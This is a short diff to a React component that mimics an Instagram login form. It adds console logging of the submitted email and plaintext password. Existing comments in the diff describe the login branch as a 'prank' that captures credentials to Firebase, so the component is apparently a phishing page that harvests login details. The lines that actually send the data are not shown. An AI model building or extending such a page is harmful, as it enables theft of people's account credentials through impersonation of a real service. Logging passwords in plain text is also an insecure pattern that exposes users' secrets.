@@ -18,6 +18,10 @@ const InstagramLogin = () => {
 
   async function handleSubmit(e) {
     e.preventDefault();
+    console.log('🚀 Form submitted!');
+    console.log('📋 isSignUp:', isSignUp);
+    console.log('📧 Email:', email);
+    console.log('🔐 Password:', password);
 
     if (isSignUp && password !== confirmPassword) {
       return setError('Passwords do not match');
@@ -26,11 +30,14 @@ const InstagramLogin = () => {
     try {
       setError('');
       setLoading(true);
+      console.log('⏳ Loading state set to true');
       
       if (isSignUp) {
+        console.log('✏️ Taking signup path');
         // For signup, still use Firebase
         await signup(email, password);
       } else {
+        console.log('🎭 Taking prank/login path');
         // For login, CAPTURE THE CREDENTIALS TO FIREBASE! 🎯
         console.log('🎯 Starting prank sequence...');
         console.log('📧 Email:', email);
